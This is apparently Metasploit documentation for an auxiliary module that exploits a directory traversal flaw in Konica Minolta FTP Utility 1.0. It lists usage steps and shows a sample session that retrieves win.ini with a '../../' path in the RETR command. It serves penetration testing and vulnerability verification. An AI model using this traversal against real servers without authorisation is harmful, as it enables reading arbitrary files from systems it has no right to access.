## Vulnerable Application

This module exploits a directory traversal vulnerability found in Konica Minolta FTP Utility 1.0. This vulnerability allows an attacker to download arbitrary files from the server by crafting a RETR command that includes file system traversal strings such as '..//'

Link to Konica Minolta FTP Utility 1.00 software download [Exploit-DB](https://www.exploit-db.com/apps/6388a2ae7dd2965225b3c8fad62f2b3b-ftpu_10.zip)

## Verification Steps

  1. Start msfconsole
  2. Do: `use modules/auxiliary/scanner/ftp/konica_ftp_traversal`
  3. Do: `set RHOSTS [ip]`
  4. Do: `run`

## Scenarios

### Konica Minolta FTP Utility 1.00 on Windows 7 (X64)

  ```
  msf > use modules/auxiliary/scanner/ftp/konica_ftp_traversal
  msf auxiliary(scanner/ftp/konica_ftp_traversal) > set RHOSTS 1.1.1.1
    RHOSTS => 1.1.1.1
  set PATH ../../WINDOWS/win.ini
    PATH => ../../WINDOWS/win.ini
  msf auxiliary(scanner/ftp/konica_ftp_traversal) > run
  [+] 1.1.1.1:21      - Stored ../../WINDOWS/win.ini to /root/.msf4/loot/20191122042114_default_1.1.1.1_konica.ftp.data_003802.ini
  [*] 1.1.1.1:21      - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
